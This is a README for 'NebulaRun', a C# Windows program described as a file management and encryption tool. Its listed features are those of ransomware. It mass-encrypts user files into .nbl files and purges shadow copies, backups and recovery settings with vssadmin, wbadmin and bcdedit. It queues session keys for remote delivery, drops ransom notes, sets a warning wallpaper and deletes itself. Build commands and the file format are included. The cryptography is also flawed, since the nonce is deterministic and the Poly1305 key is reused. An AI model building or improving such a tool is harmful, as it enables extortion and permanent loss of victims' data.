# NebulaRun

NebulaRun is a high-performance, multithreaded Windows Forms application built with C# (.NET Framework 4.5 / C# 5) designed for advanced file management, rapid I/O processing, and secure stream encryption.

---

## Architecture & Features

- **XChaCha8 Stream Cipher (Key-Only Mode):** Uses a high-speed 32-byte cryptographic key with deterministic 24-byte nonce derivation (via SHA-256), eliminating separate IV storage and requiring only the Base64 key for decryption.
- **Poly1305 Message Authentication:** Every `.nbl` file carries a 16-byte Poly1305 authentication tag in its header. Decryption verifies the tag *before* decrypting, rejecting wrong keys and tampered ciphertext immediately instead of producing corrupted plaintext. (see `Poly1305.cs`)
- **SHA-256 Key Marker:** Each encrypted `.nbl` file header begins with `SHA256(session_key)` (32 bytes), allowing the decryptor to confirm the supplied key matches the file before attempting decryption.
- **Re-Encryption Protection:** Key hashes are persisted in `HKCU\Software\NebulaRun` under `KeyHashes` (comma-separated hex). If any key hash already exists in the registry, `EncryptAll()` returns early, preventing a re-run from generating a new session key and orphaning previously-encrypted `.nbl` files.
- **High-Performance WinAPI I/O:** Leverages native WinAPI file enumeration (`FindFirstFileW` / `FindNextFileW`) combined with `Parallel.ForEach` multithreading and buffered sequential streams (`64KB` buffer) for maximum throughput.
- **Smart Path & Extension Filtering:** Automatically avoids system folders and skips paths containing `"Microsoft"` or `"Windows"` (case-insensitive), as well as `.txt` and `.nbl` files.
- **Volume Shadow Copy Purge:** Cleans up volume shadow copies, backups, and recovery settings (`vssadmin`, `wbadmin`, `bcdedit`) at startup.
- **Offline Key Queuing:** Automatically caches keys locally in a hidden secure queue (`NebulaQueue.dat`) if offline, with a background retry worker that persistently attempts delivery until successful.
- **Single-Instance Enforcement:** Uses a global named mutex (`"NB111"`) to ensure only one instance executes at a time.
- **Ransom Note Wallpaper:** Automatically drops `README_FOR_DECRYPTION.txt` into scanned directories and programmatically generates a warning bitmap wallpaper saved to `%temp%\nebula_wallpaper.bmp`. Note text is centralized via `Nbl.NoteText` so the dropped note and UI message always match.
- **Self-Deletion & Cleanup:** Automatically cleans up and deletes the executable binary upon closing or after successful decryption.

---

## Compilation & Building

To compile the project on Linux / Termux using Mono C# compiler (`mcs`):

```bash
chmod +x compile.sh
./compile.sh
```

To compile the project on Windows using CSharp Compiler (`csc.exe`):

```bash
compile.bat
```

This compiles `NebulaRun.exe` linking against Windows Forms, System.Drawing, System.Core, System.Management, and System.Net.Http. `Poly1305.cs` has no external dependencies beyond the BCL.

---

## .nbl File Format

```
Offset  Size  Field
0       32    SHA256(session_key)  — key-bound marker, validated on decrypt
32      16    Poly1305 tag         — MAC over ciphertext, verified before decrypt
48      N     ciphertext           — XChaCha8(plaintext), same length as plaintext
```

Decryption flow:
1. Verify file ends with `.nbl` and is at least 48 bytes.
2. Check `SHA256(entered_key)` against the header key hash.
3. Verify Poly1305 tag over the ciphertext using `SHA256(key)` as the Poly1305 one-time key.
4. Decrypt ciphertext with `XChaCha8(key, nonce)` where `nonce = SHA256(key)[0:24]`.
5. Write plaintext to original path and delete `.nbl`.

---
